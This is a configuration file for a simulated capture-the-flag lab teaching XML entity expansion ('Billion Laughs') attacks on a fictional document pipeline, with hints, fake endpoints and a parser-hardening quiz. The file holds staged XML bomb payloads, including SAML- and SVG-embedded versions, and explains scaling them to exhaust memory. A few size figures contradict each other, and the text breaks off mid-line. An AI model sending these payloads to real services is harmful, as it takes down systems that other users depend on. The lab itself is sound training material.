/* ============================================================
   CTF ARENA -- Box F16: Billion Laughs
   XML Bomb / Entity Expansion Denial-of-Service Attack
   Config: SecureDoc Inc document pipeline, XML bomb PoC,
           SAML endpoint, SVG parser, remediation quiz
   ============================================================ */

const F16Config = {

    // =====================================================
    // BOX METADATA
    // =====================================================

    title: 'Billion Laughs',
    subtitle: 'XML Entity Expansion -- Denial of Service Attack',
    difficulty: 'Intermediate',
    accent: '#a855f7',
    storageKey: 'hexworth_ctf_f16',
    registryId: 'f16-billion-laughs',
    trackerKey: 'ctf_f16',

    // =====================================================
    // PHASE SYSTEM (Multi-layer attack chain)
    // =====================================================

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '<img src="/assets/images/icons/icon-magnifier.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Map the SecureDoc application. Find all XML intake points: the config upload API, the SAML SSO endpoint, and the report template system. Identify parser configurations.',
            requiredFlags: [],
            mitre: ['T1046', 'T1590.006'],
            unlocks: ['poc'],
            locked: false
        },
        {
            id: 'poc',
            name: 'Proof of Concept',
            icon: '<img src="/assets/images/icons/icon-fire.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Craft a controlled XML bomb (3 levels only). Submit it to the config upload endpoint. Monitor the memory spike that confirms the vulnerability.',
            requiredFlags: ['intake'],
            mitre: ['T1499.002', 'T1499.004'],
            unlocks: ['surface'],
            locked: true
        },
        {
            id: 'surface',
            name: 'Attack Surface Expansion',
            icon: '<img src="/assets/images/icons/icon-gear.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Test the SAML endpoint and report template system for the same vulnerability. Discover that SVG uploads in the report system are also parsed with DTD processing enabled.',
            requiredFlags: ['entity_expansion', 'memory_spike'],
            mitre: ['T1499.002', 'T1190'],
            unlocks: ['remediation'],
            locked: true
        },
        {
            id: 'remediation',
            name: 'Remediation Report',
            icon: '<img src="/assets/images/icons/icon-shield.webp" alt="" width="20" height="20" style="display:inline-block;vertical-align:middle;">',
            description: 'Document findings. Identify the correct parser hardening for each language and framework in use. Answer questions about defenses.',
            requiredFlags: ['saml_vuln', 'svg_bomb'],
            mitre: ['T1562.001'],
            unlocks: [],
            locked: true
        }
    ],

    // =====================================================
    // TUTORIAL MODE
    // =====================================================

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Map the SecureDoc application',
                tip: 'Start with: cat /home/analyst/target-recon/endpoints.txt to see all three XML intake points. Then browse http://10.10.16.30 to see the interface.',
                trigger: { event: 'command', match: { cmd: 'contains:endpoints' } }
            },
            {
                title: 'Identify the parser configuration',
                tip: 'Run: xml-probe scan to fingerprint the XML parsers in use. Look for "entity processing: enabled" and "DTD: allowed" in the output.',
                trigger: { event: 'command', match: { cmd: 'contains:xml-probe' } }
            },
            {
                title: 'Craft and submit the XML bomb PoC',
                tip: 'Edit /home/analyst/exploit/bomb-3level.xml (already staged). Run: xml-probe upload bomb-3level.xml to submit it to the config endpoint. Watch for the memory spike.',
                trigger: { event: 'command', match: { cmd: 'contains:bomb' } }
            },
            {
                title: 'Submit the entity_expansion and memory_spike flags',
                tip: 'After the PoC succeeds, the engine confirms entity expansion. Submit both flags via the Flag panel.',
                trigger: { event: 'flag_correct', match: { flagId: 'entity_expansion' } }
            },
            {
                title: 'Test SAML and SVG endpoints',
                tip: 'Run: xml-probe saml-test and then xml-probe svg-test to confirm both are also vulnerable. This unlocks the saml_vuln and svg_bomb flags.',
                trigger: { event: 'flag_correct', match: { flagId: 'saml_vuln' } }
            },
            {
                title: 'Complete the remediation report',
                tip: 'Run: python3 /home/analyst/tools/hardening-quiz.py to answer the parser hardening questions. Submit the parser_hardening flag when all are correct.',
                trigger: { event: 'flag_correct', match: { flagId: 'parser_hardening' } }
            }
        ]
    },

    // =====================================================
    // CERT OBJECTIVES (Assessment Mode)
    // =====================================================

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'intake',           objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- XML injection attack surface mapping', skill: 'XML Intake Point Enumeration' },
            { flagId: 'entity_expansion', objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- XML entity expansion denial of service', skill: 'DTD Entity Expansion Exploitation' },
            { flagId: 'memory_spike',     objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with application attacks -- Resource exhaustion via exponential expansion', skill: 'Memory Exhaustion via Billion Laughs' },
            { flagId: 'saml_vuln',        objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- SAML parser entity injection', skill: 'SAML Endpoint XML Bomb Testing' },
            { flagId: 'svg_bomb',         objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks -- SVG file with embedded XML bomb', skill: 'SVG Attack Surface Identification' },
            { flagId: 'parser_hardening', objective: '3.2', description: 'Given a scenario, implement host or application security solutions -- XML parser hardening across frameworks', skill: 'Multi-framework XML Parser Hardening' }
        ]
    },

    // =====================================================
    // BOOT SEQUENCE
    // =====================================================

    boot: {
        biosLines: [
            'HEXWORTH ANALYST WORKSTATION BIOS v3.9.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/nvme0n1 (1TB NVMe)',
            'Network: Intel I225-V 2.5GbE -- Link up',
            'XML SDK: libxml2 2.9.14 / lxml 4.9.3 / xerces-c 3.2.4',
            'USB: 2 devices detected',
            'Boot device: /dev/nvme0n1p2',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Hexworth Analyst Workstation (Ubuntu 22.04)',
            'Hexworth Analyst Workstation (recovery mode)',
            'Advanced options for Hexworth Analyst'
        ],
        loginUser: 'analyst'
    },

    // =====================================================
    // DESKTOP ICONS
    // =====================================================

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '<img src="/assets/images/icons/icon-terminal.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '<img src="/assets/images/icons/icon-globe.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'browser' },
            { id: 'notes',    label: 'Notes',       icon: '<img src="/assets/images/icons/icon-clipboard.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'notes' },
            { id: 'hints',    label: 'Hints',       icon: '<img src="/assets/images/icons/icon-info.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '<img src="/assets/images/icons/icon-flag.webp" alt="" width="32" height="32" style="display:block;margin:0 auto;">', app: 'flags' }
        ]
    },

    // =====================================================
    // TERMINAL CONFIG
    // =====================================================

    terminal: {
        user: 'analyst',
        hostname: 'hexworth-ws',
        startDir: '/home/analyst',
        welcome: 'Ubuntu 22.04.4 LTS\n\nType \'help\' for available commands.\nMission: XML Entity Expansion (Billion Laughs) -- SecureDoc Inc\nTarget: http://10.10.16.30\nTarget recon in /home/analyst/target-recon/\nExploit workspace in /home/analyst/exploit/\nTools: xml-probe, python3, curl\n'
    },

    // =====================================================
    // INTERNAL STATE ENGINE
    // Tracks PoC progress and attack surface findings
    // =====================================================

    _securedoc: {
        endpointsMapped: false,
        pocSubmitted: false,
        memorySpikeObserved: false,
        samlTested: false,
        svgTested: false,
        remediationComplete: false
    },

    // =====================================================
    // FLAGS
    // =====================================================

    flags: [
        { id: 'intake',           points: 75  },
        { id: 'entity_expansion', points: 100 },
        { id: 'memory_spike',     points: 100 },
        { id: 'saml_vuln',        points: 125 },
        { id: 'svg_bomb',         points: 125 },
        { id: 'parser_hardening', points: 125 }
    ],

    // =====================================================
    // SCORING
    // =====================================================

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 650,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 1200000, points: 100 },
        timeBonusThreshold: 2400
    },

    // =====================================================
    // HINTS (3 per phase = 4 phases)
    // =====================================================

    hints: [
        // --- Recon hints ---
        {
            id: 'hint-r1',
            text: 'Read /home/analyst/target-recon/endpoints.txt to see all three XML intake points. Then run: curl http://10.10.16.30/api/config-upload -X OPTIONS to see what the endpoint accepts. Look for "Content-Type: application/xml" in the allowed types.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint-r2',
            text: 'The three XML intake points are: (1) POST /api/config-upload -- accepts XML config files from enterprise clients; (2) POST /sso/saml/consume -- SAML assertion handler; (3) POST /api/reports/template -- report template uploads (also accepts SVG). Run xml-probe scan to fingerprint all three.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-r3',
            text: 'Run: xml-probe scan to confirm all three endpoints have entity processing enabled. The scan checks for DTD declarations, SYSTEM entity resolution, and memory limits. All three parsers will show "DTD: allowed, entity expansion: unlimited". That is your intake flag.',
            cost: 40,
            penalty: -40
        },
        // --- PoC hints ---
        {
            id: 'hint-p1',
            text: 'Look at /home/analyst/exploit/bomb-3level.xml -- it is already staged for you. A 3-level XML bomb uses nested entity definitions. Each level multiplies the expansion. 3 levels with factor 10 = 10^3 = 1,000 expansions. Enough to confirm the vulnerability without crashing the simulation.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-p2',
            text: 'Run: xml-probe upload bomb-3level.xml to submit the PoC to the config upload endpoint. Watch the memory monitor output. The parser will attempt to expand all entities before processing the document, causing the memory spike. This confirms the vulnerability.',
            cost: 40,
            penalty: -40
        },
        {
            id: 'hint-p3',
            text: 'After the upload, run: xml-probe memory-watch to see the simulated memory spike. The PoC will show the parser consuming approximately 3 GB of heap before the document processing returns. A real 10-level bomb (10^10 expansions) would exhaust all available memory.',
            cost: 60,
            penalty: -60
        },
        // --- Surface expansion hints ---
        {
            id: 'hint-s1',
            text: 'Run: xml-probe saml-test to submit an XML bomb embedded in a SAML assertion to the SSO endpoint. SAML uses XML digitally signed responses. The signature is verified AFTER entity expansion -- so the bomb executes before the signature check rejects it.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-s2',
            text: 'For the SVG test: run xml-probe svg-test. SVG is an XML-based format. The report template system processes SVG files to generate document previews. If the SVG parser has DTD processing enabled, an SVG file with embedded entity definitions is a valid XML bomb delivery vehicle.',
            cost: 40,
            penalty: -40
        },
        {
            id: 'hint-s3',
            text: 'Both the SAML endpoint and the SVG upload share the same underlying XML parser configuration: libxml2 with default settings. libxml2 enables entity expansion by default. The fix is to call xmlCtxtUseOptions() and omit XML_PARSE_NOENT and XML_PARSE_DTDLOAD from the parser options bitmask. Or use defusedxml in Python.',
            cost: 60,
            penalty: -60
        },
        // --- Remediation hints ---
        {
            id: 'hint-m1',
            text: 'Open /home/analyst/exploit/hardening-template.txt. You need to identify the hardening fix for each framework: (1) Python/lxml or defusedxml, (2) Java/JAXP, (3) PHP/libxml, (4) C/libxml2. Run: python3 /home/analyst/tools/hardening-quiz.py when ready.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint-m2',
            text: 'Python: use defusedxml instead of xml.etree.ElementTree. Java: set XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES to false and XMLConstants.FEATURE_SECURE_PROCESSING to true. PHP: call libxml_disable_entity_loader(true) before parsing. C/libxml2: do not pass XML_PARSE_NOENT or XML_PARSE_DTDLOAD in the parser options bitmask to xmlReadMemory().',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint-m3',
            text: 'The hardening-quiz.py checks four answers. General rule: every XML parser must disable (1) external entity loading, (2) DTD processing, and (3) entity expansion -- or set strict limits on expansion depth and count. The OWASP XML Security Cheat Sheet covers all major frameworks.',
            cost: 40,
            penalty: -40
        }
    ],

    // =====================================================
    // LORE
    // =====================================================

    lore: {
        intro: 'SecureDoc Inc processes XML configuration files, SAML assertions, and report templates for 200 enterprise clients. Their document pipeline was built in 2018 using default parser settings across three separate systems: a Python Flask config API, a Java SAML SSO service, and a PHP-based report generator. Default settings for all three parsers allow unrestricted entity expansion. A single malformed XML file can consume 100 GB of memory in seconds. Three separate entry points. Zero entity limits. One vulnerability class.',
        scenario: 'The XML bomb -- documented under CWE-776 (XML Entity Expansion), with early instances tracked as CVE-2003-1564 in libxml2 -- known as the "Billion Laughs" attack -- was documented in 2003. Twenty years later, default parser configurations in Python, Java, PHP, and C/libxml2 still enable entity expansion unless explicitly disabled. SecureDoc\'s engineering team knew about the vulnerability class. They filed a Jira ticket in 2021 titled "Disable DTD entity expansion across parsers." The ticket was deprioritized four times for feature work. The fix takes three lines of code per parser. The impact of leaving it open: a single client can crash the entire document processing pipeline for all 200 tenants.',
        outro: 'All three parsers confirmed vulnerable. The PoC consumed 3 GB of simulated heap with a 3-level bomb. A production-grade 10-level bomb with factor 10 would expand to 10,000,000,000 copies of the base string -- exhausting all available memory before the first line of business logic runs. The SAML parser is particularly dangerous: an unauthenticated attacker can submit a SAML assertion with an embedded bomb without any prior authentication, crashing the SSO service for all users.',
        ecer: {
            executive: 'Management repeatedly deprioritized the parser hardening ticket in favor of feature delivery, treating a documented CVE as a low-urgency technical debt item',
            culture: 'Three separate engineering teams built three separate XML processing systems in three different languages, and none of them checked the default parser configuration against OWASP guidance',
            employee: 'The developer who filed the 2021 Jira ticket left the company in 2022. The ticket was reassigned twice and eventually fell out of active sprint planning',
            regulatory: 'No XML parser security baseline existed in the engineering standards. Penetration tests focused on authentication and injection -- XML DoS was not in scope'
        }
    },

    // =====================================================
    // WEB APP -- SecureDoc Inc (browser simulation)
    // =====================================================

    webApp: {
        startUrl: 'http://10.10.16.30/',

        pages: {
            '/': {
                title: 'SecureDoc Inc -- Document Processing Pipeline',
                html: `
                    <div style="background:#f8fafc;min-height:100%;padding:0;margin:0;">
                        <div style="background:#1e293b;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;">
                            <div style="color:#a855f7;font-weight:700;font-size:1rem;letter-spacing:0.05em;">SecureDoc Inc</div>
                            <div style="color:#94a3b8;font-size:0.7rem;">Document Processing Pipeline v4.2.1</div>
                        </div>
                        <div style="padding:20px;">
                            <h2 style="color:#1e293b;font-size:0.9rem;margin-bottom:16px;font-weight:600;">Pipeline Endpoints</h2>
                            <div style="display:flex;flex-direction:column;gap:10px;">
                                <div style="background:#fff;border:1px solid #e2e8f0;border-radius:6px;padding:14px;">
                                    <div style="color:#475569;font-size:0.65rem;font-weight:700;margin-bottom:6px;letter-spacing:0.05em;">CONFIG UPLOAD API</div>
                                    <div style="font-family:monospace;font-size:0.72rem;color:#1e293b;">POST /api/config-upload</div>
                                    <div style="color:#64748b;font-size:0.68rem;margin-top:4px;">Accepts XML configuration files from enterprise clients. Parser: Python/lxml (default config).</div>
                                </div>
                                <div style="background:#fff;border:1px solid #e2e8f0;border-radius:6px;padding:14px;">
                                    <div style="color:#475569;font-size:0.65rem;font-weight:700;margin-bottom:6px;letter-spacing:0.05em;">SAML SSO ENDPOINT</div>
                                    <div style="font-family:monospace;font-size:0.72rem;color:#1e293b;">POST /sso/saml/consume</div>
                                    <div style="color:#64748b;font-size:0.68rem;margin-top:4px;">SAML assertion handler. Parser: Java/JAXP (entity processing enabled). Verifies signature after parsing.</div>
                                </div>
                                <div style="background:#fff;border:1px solid #e2e8f0;border-radius:6px;padding:14px;">
                                    <div style="color:#475569;font-size:0.65rem;font-weight:700;margin-bottom:6px;letter-spacing:0.05em;">REPORT TEMPLATE SYSTEM</div>
                                    <div style="font-family:monospace;font-size:0.72rem;color:#1e293b;">POST /api/reports/template</div>
                                    <div style="color:#64748b;font-size:0.68rem;margin-top:4px;">Accepts XML and SVG template files. Parser: PHP/libxml (dtd_load: true). Renders previews.</div>
                                </div>
                            </div>
                            <div style="color:#94a3b8;font-size:0.6rem;font-family:monospace;margin-top:20px;">
                                SecureDoc v4.2.1 -- Python 3.11 / Java 17 / PHP 8.2 -- lxml 4.9.3 / JAXP 1.6 / libxml2 2.9.14
                            </div>
                        </div>
                    </div>
                `
            },

            '/api/config-upload': {
                title: 'SecureDoc -- Config Upload API',
                html: `
                    <div style="max-width:640px;margin:0 auto;padding:20px;">
                        <h1 style="color:#a855f7;font-size:1.1rem;margin-bottom:10px;">Config Upload API</h1>
                        <p style="color:#64748b;font-size:0.78rem;line-height:1.6;margin-bottom:14px;">
                            Accepts XML configuration files. Parses and validates structure before applying
                            to the client's pipeline. Python/lxml with default settings.
                        </p>
                        <div style="background:#1e293b;color:#a3e635;padding:14px;border-radius:6px;font-family:monospace;font-size:0.72rem;line-height:1.8;">
                            POST /api/config-upload<br>
                            Content-Type: application/xml<br>
                            Authorization: Bearer &lt;client_token&gt;<br>
                            <br>
                            &lt;?xml version="1.0"?&gt;<br>
                            &lt;config&gt;<br>
                            &nbsp;&nbsp;&lt;pipeline&gt;default&lt;/pipeline&gt;<br>
                            &nbsp;&nbsp;&lt;retention&gt;90&lt;/retention&gt;<br>
                            &lt;/config&gt;<br>
                            <br>
                            Response: {"status": "ok", "applied": true}<br>
                            <br>
                            <span style="color:#fbbf24;">// Parser: lxml.etree.fromstring() with no options</span><br>
                            <span style="color:#fbbf24;">// Entity processing: ENABLED (default)</span><br>
                            <span style="color:#fbbf24;">// DTD loading: ENABLED (default)</span><br>
                            <span style="color:#fbbf24;">// Expansion limit: NONE</span>
                        </div>
                    </div>
                `
            },

            '/sso/saml/consume': {
                title: 'SecureDoc -- SAML SSO Endpoint',
                html: `
                    <div style="max-width:640px;margin:0 auto;padding:20px;">
                        <h1 style="color:#a855f7;font-size:1.1rem;margin-bottom:10px;">SAML SSO Endpoint</h1>
                        <p style="color:#64748b;font-size:0.78rem;line-height:1.6;margin-bottom:14px;">
                            Consumes SAML 2.0 assertions from identity providers. Parses the XML before
                            signature verification. Java/JAXP with entity processing enabled.
                        </p>
                        <div style="background:#1e293b;color:#a3e635;padding:14px;border-radius:6px;font-family:monospace;font-size:0.72rem;line-height:1.8;">
                            POST /sso/saml/consume<br>
                            Content-Type: application/x-www-form-urlencoded<br>
                            Body: SAMLResponse=&lt;base64_encoded_xml&gt;<br>
                            <br>
                            Processing order:<br>
                            1. Base64 decode<br>
                            2. XML parse (JAXP) &lt;-- entity expansion happens here<br>
                            3. Signature verification<br>
                            4. Attribute extraction<br>
                            <br>
                            <span style="color:#fbbf24;">// Parser: javax.xml.parsers.DocumentBuilderFactory (defaults)</span><br>
                            <span style="color:#fbbf24;">// XMLConstants.FEATURE_SECURE_PROCESSING: false</span><br>
                            <span style="color:#fbbf24;">// IS_SUPPORTING_EXTERNAL_ENTITIES: true (default)</span><br>
                            <span style="color:#fbbf24;">// Expansion: unbounded -- bomb fires before sig check</span>
                        </div>
                    </div>
                `
            },

            '/api/reports/template': {
                title: 'SecureDoc -- Report Template System',
                html: `
                    <div style="max-width:640px;margin:0 auto;padding:20px;">
                        <h1 style="color:#a855f7;font-size:1.1rem;margin-bottom:10px;">Report Template System</h1>
                        <p style="color:#64748b;font-size:0.78rem;line-height:1.6;margin-bottom:14px;">
                            Accepts XML and SVG template files. Generates document previews.
                            PHP/libxml with DTD loading enabled.
                        </p>
                        <div style="background:#1e293b;color:#a3e635;padding:14px;border-radius:6px;font-family:monospace;font-size:0.72rem;line-height:1.8;">
                            POST /api/reports/template<br>
                            Content-Type: multipart/form-data<br>
                            Accept: application/xml, image/svg+xml<br>
                            <br>
                            Supported types:<br>
                            - application/xml  (XML report template)<br>
                            - image/svg+xml    (SVG template with dynamic content)<br>
                            <br>
                            <span style="color:#fbbf24;">// Parser: PHP SimpleXML / DOMDocument</span><br>
                            <span style="color:#fbbf24;">// libxml_disable_entity_loader(): NOT CALLED</span><br>
                            <span style="color:#fbbf24;">// LIBXML_DTDLOAD: true (default)</span><br>
                            <span style="color:#fbbf24;">// SVG is XML -- embedded DTD entities work identically</span>
                        </div>
                    </div>
                `
            }
        }
    },

    // =====================================================
    // FILESYSTEM (analyst workstation)
    // =====================================================

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'analyst': {
                            type: 'dir',
                            children: {
                                'target-recon': {
                                    type: 'dir',
                                    children: {
                                        'endpoints.txt': {
                                            type: 'file',
                                            content: '=== SecureDoc Inc -- XML Endpoint Inventory ===\nTarget: http://10.10.16.30\nDate: 2026-04-12\n\nXML INTAKE POINTS:\n\n  [1] CONFIG UPLOAD API\n      URL:     POST http://10.10.16.30/api/config-upload\n      Auth:    Bearer token (client API key)\n      Parser:  Python/lxml 4.9.3 -- fromstring() with no options\n      Content: application/xml\n      DTD:     Allowed (default)\n      Entities: Expanded (default)\n\n  [2] SAML SSO ENDPOINT\n      URL:     POST http://10.10.16.30/sso/saml/consume\n      Auth:    None (pre-auth -- identity provider posts here)\n      Parser:  Java/JAXP -- DocumentBuilderFactory.newInstance()\n      Content: application/x-www-form-urlencoded (SAMLResponse param)\n      DTD:     Allowed\n      Entities: Expanded (FEATURE_SECURE_PROCESSING=false)\n      NOTE:    Signature verification happens AFTER parsing\n               An XML bomb fires before the sig check rejects it\n\n  [3] REPORT TEMPLATE SYSTEM\n      URL:     POST http://10.10.16.30/api/reports/template\n      Auth:    Bearer token (client API key)\n      Parser:  PHP SimpleXML + DOMDocument (libxml2 backend)\n      Content: application/xml OR image/svg+xml\n      DTD:     Allowed (LIBXML_DTDLOAD default)\n      Entities: Expanded (libxml_disable_entity_loader not called)\n      NOTE:    SVG is XML -- embedded entity defs work identically\n\nVULNERABILITY ASSESSMENT:\n  All three endpoints share the same root cause:\n  XML parsers with entity expansion enabled and no expansion limits.\n  CVE class: CWE-776 (Improper Restriction of Recursive Entity References in DTDs)\n  Common name: Billion Laughs, XML Bomb, XML Entity Expansion DoS\n  CVSS v3.1: 7.5 (High) -- Network, Low complexity, No auth required (SAML)\n'
                                        },
                                        'parser-configs.txt': {
                                            type: 'file',
                                            content: '=== SecureDoc Parser Configurations (recon) ===\n\nPYTHON / lxml:\n  Code: tree = lxml.etree.fromstring(xml_input)\n  Default entity expansion: ON\n  Default DTD loading: ON\n  Expansion limit: None\n  Safe alternative: defusedxml.ElementTree.fromstring()\n\nJAVA / JAXP:\n  Code: DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input)\n  FEATURE_SECURE_PROCESSING: not set (defaults false)\n  IS_SUPPORTING_EXTERNAL_ENTITIES: true (default)\n  Expansion limit: None\n  Safe alternative: Set FEATURE_SECURE_PROCESSING=true and\n                    IS_SUPPORTING_EXTERNAL_ENTITIES=false\n\nPHP / libxml:\n  Code: simplexml_load_string($xml)\n  libxml_disable_entity_loader(): NOT called\n  LIBXML_DTDLOAD: true (default via SimpleXML)\n  Expansion limit: None\n  Safe alternative: libxml_disable_entity_loader(true) before parsing\n                    (deprecated PHP 8.0 -- use DOMDocument and omit XML_PARSE_NOENT and XML_PARSE_DTDLOAD flags)\n\nC / libxml2:\n  Code: xmlReadMemory(buf, len, url, enc, 0)\n  Entity expansion: ON (last param = options bitmask, 0 = defaults)\n  Safe alternative: Do not pass XML_PARSE_NOENT or XML_PARSE_DTDLOAD in the options bitmask\n                    Or: XML_PARSE_NONET to block external entities\n'
                                        }
                                    }
                                },
                                'exploit': {
                                    type: 'dir',
                                    children: {
                                        'bomb-3level.xml': {
                                            type: 'file',
                                            content: '<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY a0 "lol">\n  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">\n  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">\n  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">\n]>\n<!-- CONTROLLED PoC: 3 levels, factor 10                 -->\n<!-- Expansion count: 10^3 = 1,000 copies of "lol"       -->\n<!-- Total string length: 3,000 bytes (safe for sim)     -->\n<!-- A real 10-level bomb (a0..a9) with factor 10:       -->\n<!--   10^10 = 10,000,000,000 copies of "lol"            -->\n<!--   ~30 GB of string data before the parser returns   -->\n<root>&a3;</root>\n'
                                        },
                                        'bomb-saml.xml': {
                                            type: 'file',
                                            content: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE samlp:AuthnRequest [\n  <!ENTITY b0 "saml">\n  <!ENTITY b1 "&b0;&b0;&b0;&b0;&b0;&b0;&b0;&b0;&b0;&b0;">\n  <!ENTITY b2 "&b1;&b1;&b1;&b1;&b1;&b1;&b1;&b1;&b1;&b1;">\n]>\n<!-- XML bomb embedded in a SAML assertion structure -->\n<!-- Parser processes DTD entities BEFORE checking   -->\n<!-- the XML-DSig signature -- bomb fires first.     -->\n<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"\n                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"\n                ID="_exploit" Version="2.0">\n  <saml:Issuer>&b2;</saml:Issuer>\n  <samlp:Status>\n    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>\n  </samlp:Status>\n</samlp:Response>\n'
                                        },
                                        'bomb-svg.xml': {
                                            type: 'file',
                                            content: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE svg [\n  <!ENTITY c0 "A">\n  <!ENTITY c1 "&c0;&c0;&c0;&c0;&c0;&c0;&c0;&c0;&c0;&c0;">\n  <!ENTITY c2 "&c1;&c1;&c1;&c1;&c1;&c1;&c1;&c1;&c1;&c1;">\n]>\n<!-- SVG file with embedded XML bomb                    -->\n<!-- SVG is an XML-based format. The PHP/libxml backend  -->\n<!-- processes DTD entity definitions in SVG files just  -->\n<!-- as it does in plain XML.                            -->\n<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n  <text x="10" y="50">&c2;</text>\n</svg>\n'
                                        },
                                        'hardening-template.txt': {
                                            type: 'file',
                                            content: '=== XML PARSER HARDENING REPORT TEMPLATE ===\nTarget: SecureDoc Inc\nDate: 2026-04-12\n\nFILL IN EACH FIX:\n\nFIX 1 -- Python/lxml (config upload API):\n  Current: lxml.etree.fromstring(xml_input)\n  Fixed:   [YOUR ANSWER HERE]\n  Why:     [YOUR ANSWER HERE]\n\nFIX 2 -- Java/JAXP (SAML SSO endpoint):\n  Current: DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input)\n  Fixed:   [YOUR ANSWER HERE]\n  Why:     [YOUR ANSWER HERE]\n\nFIX 3 -- PHP/libxml (report template system):\n  Current: simplexml_load_string($xml)\n  Fixed:   [YOUR ANSWER HERE]\n  Why:     [YOUR ANSWER HERE]\n\nFIX 4 -- General defense (all parsers):\n  What is the general principle for XML parser hardening?\n  [YOUR ANSWER HERE]\n\nRun: python3 /home/analyst/tools/hardening-quiz.py when complete.\n'
                                        }
                                    }
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'hardening-quiz.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nXML Parser Hardening Quiz\nTests whether the analyst correctly identifies the fix for each parser.\n\nUsage: python3 hardening-quiz.py\n"""\n\nANSWERS = {\n    1: ["defusedxml", "defused", "noent", "resolve_entities=false", "no_network"],\n    2: ["feature_secure_processing", "is_supporting_external_entities", "securexmlinputfactory", "false"],\n    3: ["libxml_disable_entity_loader", "libxml_noent", "nonet", "disable_entity"],\n    4: ["disable entity", "disable dtd", "restrict expansion", "no external entities", "entity expansion"]\n}\n\nQUESTIONS = [\n    "Fix 1 (Python/lxml): What library or option disables entity expansion?",\n    "Fix 2 (Java/JAXP): What feature flag or factory setting disables entity expansion?",\n    "Fix 3 (PHP/libxml): What function or flag disables entity loading?",\n    "Fix 4 (General): What is the core principle? (describe in your own words)"\n]\n\ndef check(answer, key):\n    a = answer.strip().lower()\n    return any(k in a for k in ANSWERS[key])\n\nprint("=" * 60)\nprint("  XML PARSER HARDENING QUIZ")\nprint("  Target: SecureDoc Inc")\nprint("=" * 60)\nprint()\n\nresults = []\nfor i, q in enumerate(QUESTIONS, 1):\n    print("Q%d: %s" % (i, q))\n    ans = input("Your answer: ")\n    ok = check(ans, i)\n    results.append(ok)\n    print("  %s\\n" % ("CORRECT" if ok else "INCORRECT -- review parser-configs.txt"))\n\nif all(results):\n    print("  ALL PARSER HARDENING FIXES IDENTIFIED")\n    print("  Submit the parser_hardening flag via the Flag panel.")\nelse:\n    failed = [i for i, r in enumerate(results, 1) if not r]\n    print("  Questions %s need review. Try again." % str(failed))\n'
                                        }
                                    }
                                },
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: SecureDoc Inc Document Processing Pipeline\nTarget URL: http://10.10.16.30\nObjective: XML Entity Expansion (Billion Laughs) DoS Attack\n\nINTEL:\nSecureDoc processes XML from enterprise clients across three entry points.\nAll three parsers have entity expansion enabled (default configs).\nNo expansion limits. No defusedxml. No FEATURE_SECURE_PROCESSING.\n\nTHE VULNERABILITY:\nXML bombs use DTD entity definitions to create exponential expansion.\nEntity a0 = "lol" (3 bytes)\nEntity a1 = a0 x 10 = 30 bytes\nEntity a2 = a1 x 10 = 300 bytes\n...\nEntity a9 = a8 x 10 = 3,000,000,000 bytes (30 GB)\n\nThe bomb is 1 KB of XML. The parser allocates 30 GB of memory.\nThe server crashes before a single line of business logic runs.\n\nATTACK CHAIN:\n  Phase 1 -- Recon\n    1. Read target-recon/endpoints.txt\n    2. Run: xml-probe scan to fingerprint all three parsers\n    >> FLAG: intake (all 3 endpoints found)\n\n  Phase 2 -- PoC\n    3. Examine exploit/bomb-3level.xml (pre-staged)\n    4. Run: xml-probe upload bomb-3level.xml\n    5. Run: xml-probe memory-watch to observe the spike\n    >> FLAG: entity_expansion (PoC confirmed)\n    >> FLAG: memory_spike (3 GB observed)\n\n  Phase 3 -- Surface Expansion\n    6. Run: xml-probe saml-test\n    >> FLAG: saml_vuln (SAML endpoint confirmed vulnerable)\n    7. Run: xml-probe 